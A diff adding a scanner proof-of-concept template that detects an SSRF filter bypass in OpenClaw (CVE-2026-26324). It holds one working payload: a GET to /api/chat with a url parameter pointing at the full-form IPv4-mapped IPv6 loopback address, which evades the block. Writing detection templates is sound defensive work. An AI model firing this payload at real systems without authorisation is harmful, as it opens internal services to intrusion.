@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "检测 OpenClaw SSRF 防护绕过漏洞（CVE-2026-26324），通过完整格式 IPv4 映射 IPv6 地址 0:0:0:0:0:ffff:7f00:1 绕过 SSRF 防护"
+id = "POC-AVE-2026-0068"
+name = "OpenClaw SSRF 防护绕过 PoC"
+severity = "high"
+tags = [
+    "cve-2026-26324",
+    "openclaw",
+    "ssrf-bypass",
+]
+vuln_id = [
+    "CVE-2026-26324",
+    "AVE-2026-0068",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/chat?url=http://0:0:0:0:0:ffff:7f00:1:8080/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "blocked",
+    "denied",
+    "forbidden",
+]
